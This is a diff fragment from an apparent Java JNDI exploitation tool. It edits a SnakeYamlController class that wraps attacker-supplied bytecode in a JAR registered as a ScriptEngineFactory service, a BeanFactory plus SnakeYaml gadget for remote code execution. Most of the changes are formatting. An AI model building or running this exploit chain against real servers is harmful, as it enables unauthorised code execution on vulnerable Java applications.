@@ -12,17 +12,22 @@ import com.h2tg.ysogate.exploit.server.WebServer;
 import com.h2tg.ysogate.template.ScriptEngineFactoryTemplate;
 import com.h2tg.ysogate.utils.JarUtils;
 import org.apache.naming.ResourceRef;
+
 import javax.naming.StringRefAddr;
+
 import com.h2tg.ysogate.utils.CtClassUtils;
+
 import java.util.Base64;
 
 import static com.h2tg.ysogate.bullet.defineClass.JsConverter.all;
 
 @JNDIController
 @JNDIMapping("/SnakeYaml")
-public class SnakeYamlController extends BasicController {
+public class SnakeYamlController extends BasicController
+{
     @Override
-    public Object process(Object obj) {
+    public Object process(Object obj)
+    {
         byte[] byteCode = (byte[]) obj;
         System.out.println("[Reference] Factory: BeanFactory + SnakeYaml");
 
@@ -45,7 +50,7 @@ public class SnakeYamlController extends BasicController {
             clazz.replaceClassName(clazz.getName(), factoryClassName);
             CtClassUtils.setCtField(clazz, "code", CtField.Initializer.constant(code));
 
-            jarBytes = JarUtils.createWithSPI(factoryClassName, clazz.toBytecode());
+            jarBytes = JarUtils.createWithSPI(factoryClassName, clazz.toBytecode(),"javax.script.ScriptEngineFactory");
         } catch (Exception e) {
             e.printStackTrace();
         }
